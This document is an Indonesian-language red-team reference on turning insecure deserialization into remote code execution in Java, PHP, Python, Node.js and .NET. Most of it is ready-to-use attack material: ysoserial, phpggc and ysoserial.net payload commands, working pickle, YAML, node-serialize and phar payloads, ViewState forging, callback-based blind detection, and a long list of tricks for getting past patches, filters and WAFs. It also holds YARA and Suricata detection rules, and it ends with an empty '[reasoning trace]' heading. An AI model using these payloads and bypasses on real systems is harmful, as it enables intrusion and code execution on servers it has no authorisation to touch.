# deser — web

# Insecure Deserialization → RCE: Referensi Red Team

## Tabel Ringkas: Sink, Versi Rentan, Primitive

| Bahasa/Runtime | Sink deserialisasi | Versi/library rentan | Primitive |
|---|---|---|---|
| Java | `ObjectInputStream.readObject` | Commons-Collections ≤3.2.1, ≤4.0 | Gadget chain → `Runtime.exec` |
| Java | `XMLDecoder` | JDK 1.6-8 | Instantiate + invoke |
| Java | `readObject` + URLDNS | JDK 6/7/8 (semua) | DNS callback deteksi saja |
| PHP | `unserialize` | PHP 5.x-8.x | `__destruct`/`__wakeup`/`__toString` chain |
| PHP | `phar://` wrapper | PHP 5.3-8.x | Trigger unserialize saat file op |
| Python | `pickle.loads` | semua | `__reduce__` → `os.system` |
| Python | `yaml.load` (bukan SafeLoader) | PyYAML <6.0 | `!!python/object/apply` |
| Node | `node-serialize` (<=0.0.4) | `unserialize()` | IIFE via `_$$ND_FUNC$$_` |
| Node | `js-yaml` unsafe | js-yaml <3.13.1/<4 (early) | `!!js/function` |
| .NET | `BinaryFormatter` | .NET Framework semua, .NET ≤8 (opt-in) | `ObjectDataProvider` + XAML |
| .NET | `ViewState` tanpa MAC | ASP.NET 1.x-4.8 | `TypeConfuseDelegate` + `ObjectStateFormatter` |

---

## Java

### 1. ksoserial — CommonsCollections 1-7

**Yang dikirim:** base64/raw serialized Java byte stream (`AC ED 00 05 ...`) ke endpoint yang memanggil `ObjectInputStream.readObject()` (RMI, JMX, HTTP body, JSF ViewState, WebLogic T3, Spring HTTP invoker, session cookie tidak ditandatangani).

**Command per chain** (ganti `CMD`):
```bash
# CC1 (CommonsCollections 3.1-3.2.1, JDK <8u71 untuk AnnotationInvocationHandler path)
java -jar ysoserial.jar CommonsCollections1 'CMD' > cc1.bin

# CC2 (commons-collections4 4.0, JDK 7+)
java -jar ysoserial.jar CommonsCollections2 'CMD' > cc2.bin

# CC3 (commons-collections 3.2.1, pakai TemplatesImpl)
java -jar ysoserial.jar CommonsCollections3 'CMD' > cc3.bin

# CC4 (commons-collections4 4.0)
java -jar ysoserial.jar CommonsCollections4 'CMD' > cc4.bin

# CC5 (commons-collections 3.1-3.2.1, JDK 8+ — bypass 8u71 official fix)
java -jar ysoserial.jar CommonsCollections5 'CMD' > cc5.bin

# CC6 (commons-collections 3.2.1, independent of InvokerTransformer serialization -> bypass strict filter)
java -jar ysoserial.jar CommonsCollections6 'CMD' > cc6.bin

# CC7 (commons-collections 3.2.1/4.0, pakai Hashtable.readObject)
java -jar ysoserial.jar CommonsCollections7 'CMD' > cc7.bin
```

| Chain | Library | JDK | Trigger class | Catatan |
|---|---|---|---|---|
| CC1 | cc 3.1-3.2.1 | 6/7, <8u71 | `AnnotationInvocationHandler` | Patch 8u71 ubah field, closed |
| CC2 | cc4 4.0 | 7+ | `TemplatesImpl` + `PriorityQueue` | jalan tanpa `InvokerTransformer` |
| CC3 | cc 3.2.1 | 7+ | `TemplatesImpl` + `TrAXFilter` | cadeau untuk `InvokerTransformer` diblok |
| CC4 | cc4 4.0 | 7+ | `TrAXFilter` | varian cc4 |
| CC5 | cc 3.2.1 | 8+ | `BadAttributeValueExpException` | tembus blacklist `InvokerTransformer` 8u71 |
| CC6 | cc 3.2.1 | 8+ | `TiedMapEntry` + `HashSet` | tidak serialisasi InvokerTransformer |
| CC7 | cc 3.2.1/4.0 | 8+ | `Hashtable.readObject` | viable di banyak filter |

### 2. URLDNS — deteksi buta tanpa gadget
**Yang dikirim:** `HashMap` dengan `URL` sebagai key/value, `hashCode()` dipicu saat `readObject`.
**Efek:** DNS lookup keluar — hanya bukti deserialisasi terjadi, tidak ada RCE.
```bash
java -jar ysoserial.jar URLDNS 'http://<collab>.oast.pro' > urldns.bin
# deteksi: curl body @ urldns.bin ke target -> monitor DNS/HTTP
```

### 3. JDK-only chain (tanpa dependency eksternal)
- `Jdk7u21`: `TemplatesImpl` + `AnnotationInvocationHandler` — JDK <8u20 (fixed 8u20).
- `JRMPClient`: `UnicastRef` di `RMIConnectionImpl` — biarkan target melakukan outbound ke JRMP listener (`ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'CMD'`), verbose tetapi dependensi nol.
- `Hibernate1/2`, `Spring1/2`, `MozillaRhino1`, `Groovy1` untuk target yang punya library umum.

### 4. Library umum yang jadi gadget
| Gadget | Library target | Primitive |
|---|---|---|
| `CommonsBeanutils1` | beanutils 1.9.2 | getter chain → `TemplatesImpl` |
| `ROME` | rome 1.0 | `ToStringBean` → invoke |
| `Spring1/2` | spring-core 4.x | `MethodInvokeTypeProvider` |
| `Groovy1` | groovy 2.3+ | `MethodClosure` + `ConvertedClosure` |
| `Hibernate1/2` | hibernate-core 4.x/5.x | `PojoBean` |
| `C3P0` | c3p0 0.9.5.2 | `PoolBackedDataSource` → JNDI |
| `Click1`, `Wicket1` | web framework | |

### 5. Signature deteksi Java
```yaml
# WAF/Suricata rule (base64 body yang decode ke stream Java)
alert http any any -> any any (msg:"Java serialized stream"; \
  content:"|AC ED 00 05|"; depth:1; \
  content:"java/"; distance:0; \
  sid:9000001; rev:1;)

# gzip-transport: Content-Encoding: gzip + body magic 1f 8b yang decode ke AC ED 00 05
alert http any any -> any any (msg:"Gzip Java stream"; \
  content:"|1F 8B|"; depth:2; \
  flow:to_server; sid:9000002;)

# YARA untuk payload
rule java_serialized_gadget {
  strings:
    $magic = { AC ED 00 05 }
    $cc  = "org/apache/commons/collections"
    $tr  = "com/sun/org/apache/xalan/internal/xsltc"
    $tpl = "TemplatesImpl"
    $inv = "InvokerTransformer"
  condition: $magic at 0 and 2 of ($cc,$tr,$tpl,$inv)
}
```
Endpoint logging: aktifkan `-Djava.util.logging` atau agent `jdk.deserialization.filter` (JEP 290) — filter `jdk.serialFilter=!org.apache.commons.collections.functors.*` mematikan CC1-7.

---

## PHP

### 1. `unserialize` — POP chain buatan
**Yang dikirim:** string hasil `serialize()` yang berisi class + magic method (`__destruct`, `__wakeup`, `__toString`, `__call`, `__get`).
**Contoh minimal POP ke `system()`** (framework umum):
```php
class A { public $cmd; function __destruct(){ system($this->cmd); } }
echo serialize(new A());   // O:1:"A":1:{s:3:"cmd";s:2:"id";}
```
Kirim ke endpoint yang memanggil `unserialize($_COOKIE['x'])`, session handler default (`php`), atau Laravel `X-XSRF-TOKEN` (decrypt → unserialize) pada versi <8.x dengan APP_KEY bocor.

**POP chain umum:**
| Framework/library | Entry magic | Versi rentan | End |
|---|---|---|---|
| Monolog <2.3.5 | `__destruct` → `Handler` | CVE-2021-** | RCE via `SyslogHandler`/`StreamHandler` |
| Guzzle <6.5.0/7.x | `__destruct` → `FileCookieJar` | | file write |
| Laravel (phpggc chain `laravel/rceX`) | `__destruct` | 5.x-8.x | `system` |
| Symfony (phpggc `symfony/rce5`) | `__destruct` | 3.x-5.x | RCE |
| Doctrine (`doctrine/rceX`) | `__destruct` | | RCE |

**Generate cepat dengan phpggc:**
```bash
phpggc -u laravel/rce2 'system' 'id'          # URL-encoded
phpggc -b monolog/rce1 'system' 'id'          # base64
phpggc laravel/rce9 'exec' 'id' > payload.bin
```

**Signature:**
```
# YARA
rule php_serialized_pop {
  strings:
    $s = /O:[0-9]+:"[A-Za-z\\_]+":/ 
    $w = "wakeup"
    $d = "destruct"
  condition: $s and 1 of ($w,$d)
}
# Suricata
alert http any any -> any any (msg:"PHP serialized in body/cookie";
  content:"O:"; pcre:"/O:\d+:\"[A-Za-z\\\\_]+\"/"; sid:9010001;)
```
**Gagal kapan:** magic method dipanggil tapi `__destruct` mati karena `exit`/`die` (unserialize di dalam destructor tidak jalan), atau class tidak di-autoload.

### 2. `phar://` — deserialisasi via file operation
**Konsep:** PHP ≥5.3 memperlakukan `phar://` sebagai wrapper; saat *seluruh* metadata phar (`manifest`) dibaca ulang, PHP otomatis `unserialize` metadata. Trigger: `file_exists`, `filesize`, `getimagesize`, `md5_file`, `glob`, `copy`, `file_put_contents` — semua fungsi yang menerima path.

**Yang dikirim:** file `.phar` valid berisi payload di metadata, di-upload lewat fitur upload avatar/doc. Path yang disuntikkan (`phar:///tmp/up/x.phar/x`) masuk ke fungsi file.

**Generate:**
```php
$p = new Phar('/tmp/x.phar', 0, 'x.phar');
$p->startBuffering();
$p['a.txt'] = 'x';
$p->setMetadata(new A());        // A sama seperti POP di atas
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->stopBuffering();
```
**Bypass:** `phar.readonly=0` dibutuhkan di sisi attacker; di server target `phar.readonly` tidak relevan — hanya attacker yang perlu build. Rename ke `.jpg` tetap valid (magic `__HALT_COMPILER();` di stub). PHP 8.0+ menandai metadata unserialize di dalam `phar://` sebagai *deprecated* kecuali `phar.cache_list`, tapi masih jalan sampai 8.x untuk path `phar://`.

**Signature:**
```
rule phar_upload {
  strings:
    $halt = "__HALT_COMPILER();"
    $man  = "GBMB"            # phar manifest magic
  condition: $halt and $man at (0..1024)
}
```
Deteksi *sink*: grep kode untuk `file_exists(.*\$_` + fungsi file yang menerima input user — pola `phar_deserialization` (CVE-2018-5712 style).

---

## Python

### 1. `pickle.loads`
**Yang dikirim:** byte stream `\x80\x04...` ke endpoint yang `pickle.loads` (Flask session, cache, ML model loading, RPC).

**Payload:**
```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(E())        # b'\x80\x04\x95...'
```
**FYI:** `pickle` juga jalan lewat `pickletools`-agnostic path — `__reduce__`/`__reduce_ex__` adalah satu-satunya yang dipanggil; `__eq__`/`__hash__` tidak trigger saat unpickle.

**Signature:**
```
# YARA
rule pickle_payload {
  strings:
    $op1 = { 80 04 }            # proto 4
    $op2 = { 80 05 }            # proto 5
    $ev  = "os\nsystem"
    $ev2 = "posix\nsystem"
    $rt  = "R"                  # REDUCE opcode
  condition: ($op1 at 0 or $op2 at 0) and 1 of ($ev,$ev2)
}
# Suricata
alert http any any -> any any (msg:"Python pickle in body";
  content:"|80 04|"; depth:2; content:"system"; distance:0; sid:9020001;)
```
**Gagal:** `pickle.Unpickler(find_class=...)` membatasi class; `pickle` di Python 3.8+ masih mengizinkan semua global kecuali dibatasi eksplisit.

### 2. `yaml.load` (unsafe)
**Yang dikirim:** teks YAML dengan tag `!!python/object/apply` ke endpoint config upload.
```yaml
!!python/object/apply:os.system ["id"]
```
**Versi:** PyYAML <5.1 memanggil `yaml.load` default unsafe; 5.1+ default `Loader=yaml.SafeLoader`, tetapi kode lama memanggil `yaml.load(f, Loader=yaml.UnsafeLoader)` eksplisit — tetap rentan.

**Signature:**
```
rule yaml_python_tags {
  strings:
    $t1 = "!!python/object/apply"
    $t2 = "!!python/object/new"
    $t3 = "!!python/object:"
    $t4 = "!!python/module:"
  condition: any of them
}
```
**Beda kunci:** `yaml.safe_load` tidak pernah trigger; `yaml.FullLoader` (5.1+) memblok `python/object/apply` — jadi deteksi versi via response error (`could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply'` = Loader aman).

---

## Node.js

### 1. `node-serialize` <=0.0.4
**Yang dikirim:** objek JSON dengan fungsi di key `_$$ND_FUNC$$_`. `unserialize()` melakukan `eval` pada string fungsi, lalu memanggil IIFE `()`.
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```
**Sink:** `require('node-serialize').unserialize(req.body)` pada endpoint lama (banyak di boilerplate 2016-2018). Package deprecated.

**Signature:**
```
rule nodeserialize {
  strings:
    $k = "_$$ND_FUNC$$_"
    $i = "()" 
  condition: $k
}
```

### 2. `js-yaml` unsafe (`!!js/function`)
**Yang dikirim:** YAML dengan `!!js/function` (hanya aktif jika loader `DEFAULT_FULL_SCHEMA` / `load()` tanpa options di versi lama, atau `safeLoad` diganti).
```yaml
!!js/function "function(){ return require('child_process').execSync('id') }"
```
**Versi:** js-yaml <3.13.1 (CVE-2019-**) dan 4.0.0 awal — `load()` default jadi `safeLoad` (eksplisit) setelah 3.13.1. `js-yaml@4` sepenuhnya hapus `!!js/*` di loader default.

**Signature:**
```
rule jsyaml_func {
  strings:
    $t = "!!js/function"
    $r = "!!js/regexp"
  condition: any of them
}
```

---

## .NET

### 1. `BinaryFormatter`
**Yang dikirim:** base64/raw stream `AAEAAAD/////AQAAAAAAAAAM...` (magic `00 01 00 00 00 FF FF FF FF`).
**RCE:** gadget `TypeConfuseDelegate` (via `SortedSet` + `Comparison`) atau `ObjectDataProvider` + `XamlReader` ke endpoint yang `BinaryFormatter.Deserialize` (ViewState tanpa MAC, .NET Remoting, `SessionState` out-of-proc, `ObjectStateFormatter`, `LosFormatter`).

**Generate dengan ysoserial.net:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc" -o raw > bf.bin
ysoserial.exe -f LosFormatter    -g ObjectDataProvider -c "calc"
```

**Versi/konteks:**
- .NET Framework ≤4.8: `BinaryFormatter` aktif default.
- .NET 5-8: `BinaryFormatter` masih ada tapi `EnableUnsafeBinaryFormatterSerialization=false` default di .NET 5+; `AppContext` switch dapat diaktifkan aplikasi yang masih butuh.
- .NET 9: dihapus (removed).

**Signature:**
```
rule dotnet_binaryformatter {
  strings:
    $m = { 00 01 00 00 00 FF FF FF FF }
    $t1 = "System.Data.Services.Internal.ExpandedWrapper"
    $t2 = "TypeConfuseDelegate"
    $t3 = "ObjectDataProvider"
  condition: $m at 0 and any of ($t1,$t2,$t3)
}
```

### 2. `ViewState` tanpa MAC
**Yang dikirim:** form field `__VIEWSTATE` (base64) ke aplikasi ASP.NET 1.x-4.8 dengan `<pages enableViewStateMac="false"/>` atau `machineKey` bocor (leak via `/trace.axd`, config disclosure, atau CVE-2020-**) — `ObjectStateFormatter.Deserialize` memicu gadget.
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" \
  --path="/default.aspx" --apppath="/" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --generator="<hex, dari __VIEWSTATEGENERATOR>"
```
**Deteksi:** cek header/body `__VIEWSTATEGENERATOR` + `__VIEWSTATE` tanpa `__VIEWSTATEMAC`; base64 ViewState dengan prefix `AAEAAAD/////` = `ObjectStateFormatter` (bukan `LosFormatter` legacy).

**Signature:**
```
rule dotnet_viewstate_oos {
  strings:
    $v = "__VIEWSTATE="
    $m = "AAEAAAD/////"      # ObjectStateFormatter signature base64
    $g = "__VIEWSTATEGENERATOR"
  condition: $v and $m and $g
}
```

---

## Tabel Payload Generate (ringkas operasional)

| Runtime | Tool | Perintah | Output mime |
|---|---|---|---|
| Java | ysoserial | `java -jar ysoserial.jar CC6 'CMD'` | `application/x-java-serialized-object` |
| Java | ysoserial | `java -jar ysoserial.jar URLDNS 'http://x.oast'` | DNS callback |
| PHP | phpggc | `phpggc -u laravel/rce9 system id` | `application/x-www-form-urlencoded` |
| PHP | manual | `php build_phar.php` | `image/jpeg` (with stub) |
| Python | pickle | `python3 -c "..."` | `application/octet-stream` |
| Node | manual | string JSON `_$$ND_FUNC$$_` | `application/json` |
| .NET | ysoserial.net | `-f BinaryFormatter -g TypeConfuseDelegate` | `application/octet-stream` |

---

## Tabel Signature Deteksi (konsolidasi)

| Teknik | Magic byte / marker | Lokasi cek |
|---|---|---|
| Java serialized | `AC ED 00 05` (raw) / `1F 8B` + decode | body, cookie, session, `Content-Type: application/x-java-serialized-object` |
| Java gzip | `1F 8B 08` | body + `Content-Encoding: gzip` |
| PHP serialize | `O:<n>:"Cls"` / `a:<n>:{` | body, cookie, `X-XSRF-TOKEN` |
| Phar | `__HALT_COMPILER();` + `GBMB` | file upload / path sink |
| Pickle | `80 04` / `80 05` di offset 0 | body, file upload (.pkl, .bin) |
| YAML unsafe | `!!python/object/apply` / `!!js/function` | body, file upload (.yml, .yaml) |
| node-serialize | `_$$ND_FUNC$$_` | JSON body |
| .NET BF | `00 01 00 00 00 FF FF FF FF` | body |
| .NET ViewState | `AAEAAAD/////` | form `__VIEWSTATE` |

---

## Jebakan operasional (yang bikin teknik ini gagal di lapangan)

1. **JDK patch level mematikan chain.** CC1 mati di 8u71+ (struktur `AnnotationInvocationHandler` berubah). 8u191+ `com.sun.jndi.ldap.object.trustURLCodebase=false` default → JNDI (C3P0, ROME+JNDI) gagal RCE, hanya DNS. Banyak writeup lama tidak menyebut ini; payload muncul `NullPointerException` di log, bukan RCE.

2. **JEP 290 / filter serialisasi.** JDK 9+ bisa `jdk.serialFilter` set global, Tomcat 9 `serializationFilter`, Spring `SerializationFilter`. Payload class-based (CC*) ditolak di `readObject` sebelum trigger — perlu chain JDK-only (`Jdk7u21` mati, `JRMPClient` sering di-block karena outbound port).

3. **`ObjectInputFilter` custom wrap.** Banyak aplikasi Spring Boot memakai `SerializingConverter` + whitelist (`addAllowedPattern`). URLDNS tetap jalan (HashMap+URL lolos whitelist umum), tapi trigger gadget tidak — deteksi sukses, RCE gagal.

4. **Commons-Collections 3.2.2+ / 4.1+.** Sejak 3.2.2 `InvokerTransformer` tidak serializable (throw), 4.1 sama. Cek `mvn dependency:tree` bukan versi manifest — shade/uber-jar sering salah lapor. Kalau target pakai `commons-collections4:4.1`, CC2/CC4 mati; cari `CommonsBeanutils1` (beanutils 1.9.2 masih vulnerable, 1.9.4 fix sebagian).

5. **`TemplatesImpl` butuh `-Djdk.xml.*` tidak strict.** JDK 9+ dengan `SecurityManager` atau `--illegal-access=deny` (JDK 17 default `deny`) memblok `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` reflect — CC2/3/4 gagal. Solusi: `Jdk7u21` juga mati, pindah ke `JRMPClient` (butuh outbound) atau `CommonsBeanutils1`.

6. **`phar://` di PHP 8.** PHP 8.0+ menampilkan `PharMetadataUnserializeDeprecated` warning di log; banyak WAF memblok string `phar://`; `realpath`/`include_path` tidak memicu manifest read di semua path. Pastikan sink adalah fungsi yang membaca *manifest*, bukan hanya `file_get_contents` (yang membaca isi, bukan metadata). Yang bekerja: `file_exists`, `is_file`, `getimagesize`, `md5_file`, `copy` (bukan `file_get_contents`).

7. **Upload `phar` anda tidak akan lulus kalau server cek MIME `image/*`.** Rename + stub `GIF89a` + `__HALT_COMPILER();` masih valid; namun `getimagesize` di server justru **trigger** — itu fitur, bukan bug. Gagal kalau server hapus file upload setelah validasi; butuh path traversal atau rename race.

8. **PHP `unserialize` di framework modern.** Laravel ≥9 pakai `SignedUrl` + `encrypt` (AES-256-CBC) untuk `X-XSRF-TOKEN`; butuh `APP_KEY`. Symfony `serialize` di session pakai `PhpSerializer` yang `unserialize` dengan `['allowed_classes' => false]` — POP mati. Cek config: `SessionHandler` yang rentan = `php`/`files` + `unserialize` raw, bukan `doctrine`/`redis` terbaru.

9. **Python pickle di Python 3.13.** `pickle` default proto 4 di 3.8+, tapi 3.13 masih membuka `find_class` global. Yang mematikan: `pickle.Unpickler.find_class` override di library (mis. `torch.load` 2.6+ default `weights_only=True`). Target ML model loading `torch.load` pre-2.6 rentan; 2.6+ default aman.

10. **`yaml.load` default sudah aman.** PyYAML 6.0+ default `Loader` = `SafeLoader` saat argumen tidak diberi — `yaml.load(stream)` **tetap aman** di 6.x. Yang rentan hanya kode yang eksplisit `Loader=yaml.UnsafeLoader`/`FullLoader`/`BaseLoader`/`CLoader`. Deteksi versi lewat response error; jangan asumsikan semua `yaml.load` rentan.

11. **`node-serialize` hampir extinct.** Package NPM `node-serialize` versi 0.0.4 deprecated 2019; masih muncul di codebase legacy, tapi `unserialize` tidak memanggil IIFE kecuali payload diakhiri `()`. Deteksi string `_$$ND_FUNC$$_` tanpa `()` = eval saja, tidak exec. Kalau di log muncul `Function is not defined`, target pakai `safe-eval`/`vm` sandbox.

12. **.NET `BinaryFormatter` di .NET 5+ default off.** `EnableUnsafeBinaryFormatterSerialization=false` di `runtimeconfig.json`; payload `AAEAAAD/////` di endpoint .NET Core 5+ akan `PlatformNotSupportedException` di log, bukan RCE. Cek header `Server: Kestrel` + target `.NET Framework` (IIS+`windows`), atau cari app yang secara eksplisit `AppContext.SetSwitch("System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", true)`.

13. **ViewState MAC default on sejak .NET 4.5.2.** Semua aplikasi ASP.NET 4.5.2+ default `enableViewStateMac=true` dan `ViewStateEncryptionMode=Auto` — butuh `machineKey` bocor. Url scan `__VIEWSTATEGENERATOR` tidak cukup; cari `machineKey` di `web.config` disclosure (`.config` exposed, `/trace.axd`, `elmah.axd`, backup file). Tanpa key, `ObjectStateFormatter` payload = MAC fail 500.

14. **Gadget butuh classpath match.** `ysoserial.dll` v1.36 punya `-p` plugin vs generator syntax (`-f -g`); banyak tutorial lama pakai `-p` yang hilang di versi baru. Untuk .NET 4.5.2 target ViewState, gunakan `-p ViewState` + `--path` HARUS sama dengan path target (termasuk case) atau MAC valid pun tetap ditolak — path mismatch = invalid viewstate. `--apppath` untuk virtual directory, biasanya `/` tapi bisa `/app`.

15. **Serialization filter di Spring Boot.** `spring-boot-starter-security` + `SessionRepository` Redis bisa pakai `Jackson2JsonRedisSerializer` (tidak rentan pickle Java) vs `JdkSerializationRedisSerializer` (rentan). Log error `Cannot deserialize` vs `ClassNotFound` membedakan; jangan salah kirim payload Java ke Redis serializer JSON — hasilnya null, bukan RCE.

16. **`Content-Type` mismatch.** Spring `SerializationUtils.deserialize` di endpoint HTTP invoker cek `Content-Type: application/x-java-serialized-object`; kirim dengan header salah = 415, bukan panic. Untuk T3 WebLogic, frame protocol T3 wajib (`t3 12.2.1\nAS:255\nHL:19\n\n`), body raw tidak akan diproses — pakai `weblogic-framework`/`ysoserial` `JRMPClient` dengan framing benar.

17. **Egress DNS/HTTP Anda hilang.** URLDNS butuh target resolusi DNS. Di VPC tertutup, target pakai resolver internal tanpa callback; gunakan `DNS exfil via query length` atau cek response time (delay 3-5s via `Thread.sleep` payload tidak mungkin — gunakan `TemplatesImpl` timing). Fallback: blind RCE via `CommonsBeanutils1` dengan `exec 'sleep 5'`.

18. **Blind deserialization di cookie.** Banyak framework simpan Java serialized di cookie session (`JSESSIONID` base64). WAF sering blok `AC ED 00 05` base64 (`rO0AB...`) sebagai signature default — coba gzip (`H4sI...`) atau `Content-Encoding: gzip` body. Decode base64 dulu, cek prefix `rO0AB` = Java stream.

19. **PHP `unserialize` object injection vs RCE.** Ada POP chain tapi eksekusi butuh `system`/`exec` tidak di-`disable_functions`. Cek `phpinfo` bocor atau uji `phpggc -l` target yang matching; PHP modern (8.x) dengan `open_basedir` dan `disable_functions=exec,passthru,shell_exec,system,proc_open,popen` = POP sampai file write saja, RCE gagal.

20. **Race condition upload `phar`.** File dihapus sebelum sink path jalan (`phar:///tmp/x` → 404). Butuh: upload → sink dalam request yang sama (lewat LFI path langsung), atau path permanen (avatar, attachment). Upload `<random>.jpg` ke user avatar, lalu trigger `phar://` via LFI di endpoint lain — dalam satu sesi tanpa GC cron.

---

## [reasoning trace]


